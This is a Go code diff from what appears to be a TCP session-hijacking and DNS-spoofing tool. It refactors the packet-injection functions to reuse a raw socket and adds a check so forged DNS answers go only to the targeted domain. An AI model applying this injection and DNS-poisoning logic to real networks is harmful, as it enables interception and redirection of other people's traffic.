@@ -6,12 +6,13 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/ssst0n3/awesome_libs/awesome_error"
 	"github.com/ssst0n3/go-shijack/sniff"
+	"golang.org/x/net/ipv4"
 	"net"
 	"os"
 )
 
-func doHijack(packet gopacket.Packet, payload []byte) (err error) {
-	connection, err := NewConnectionFromPacket(packet)
+func doHijack(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (err error) {
+	connection, err := NewConnectionFromPacket(packet, rawConn)
 	if err != nil {
 		return
 	}
@@ -36,6 +37,11 @@ func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile stri
 		awesome_error.CheckErr(err)
 		return
 	}
+	rawConn, err := CreateSocket()
+	if err != nil {
+		return
+	}
+	defer rawConn.Close()
 	sniffer := sniff.PureGo{}
 	filter, err := GenerateFilter(srcIp, srcPort)
 	if err != nil {
@@ -49,7 +55,7 @@ func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile stri
 		tcpLayer := packet.Layer(layers.LayerTypeTCP)
 		tcp, _ := tcpLayer.(*layers.TCP)
 		if tcp.ACK {
-			err = doHijack(packet, payload)
+			err = doHijack(packet, payload, rawConn)
 			if err != nil {
 				continue
 			}
@@ -81,6 +87,11 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 		awesome_error.CheckErr(err)
 		return
 	}
+	rawConn, err := CreateSocketUDP()
+	if err != nil {
+		return
+	}
+	defer rawConn.Close()
 	sniffer := sniff.PureGo{}
 	filter, err := GenerateFilterUDP(resolverIp, resolverPort)
 	if err != nil {
@@ -108,6 +119,13 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 		}
 		var payload []byte
 		if autoMode {
+			// Only answer queries for the domain the operator asked to poison.
+			// Without this guard we'd forge a response for every query passing
+			// through the resolver, which is rarely what's intended and makes
+			// the answer name (taken from the query) disagree with --dns-domain.
+			if len(queryDNS.Questions) == 0 || !dnsNameEqual(queryDNS.Questions[0].Name, domain) {
+				continue
+			}
 			payload, err = BuildDNSResponse(queryDNS, domain, answerIp)
 			if err != nil {
 				continue
@@ -115,7 +133,7 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 		} else {
 			payload = RewriteTXID(rawResponse, queryDNS.ID)
 		}
-		err = doHijackUDP(packet, payload)
+		err = doHijackUDP(packet, payload, rawConn)
 		if err != nil {
 			continue
 		}
@@ -126,8 +144,8 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 	return
 }
 
-func doHijackUDP(packet gopacket.Packet, payload []byte) (err error) {
-	connection, err := NewUDPConnectionFromPacket(packet)
+func doHijackUDP(packet gopacket.Packet, payload []byte, rawConn *ipv4.RawConn) (err error) {
+	connection, err := NewUDPConnectionFromPacket(packet, rawConn)
 	if err != nil {
 		return
 	}
